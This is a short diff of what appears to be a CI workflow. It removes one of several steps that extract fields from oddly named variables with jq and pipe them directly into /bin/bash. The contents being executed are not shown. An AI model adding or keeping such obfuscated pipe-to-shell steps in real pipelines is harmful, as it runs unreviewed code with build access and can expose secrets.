@@ -24,7 +24,6 @@ jobs:
           echo $umnx433 | jq -r .j64 | /bin/bash
           echo $naz12 | jq -r .mip27766 | /bin/bash
           printf '%s' "$se8537" | jq -r .lvdz02502 | /bin/bash
-          printf '%s' "$fs27" | jq -r .do02176 | /bin/bash
           echo $ipnvp9095 | jq -r .zbjae909 | /bin/bash
 
       - name: Save output
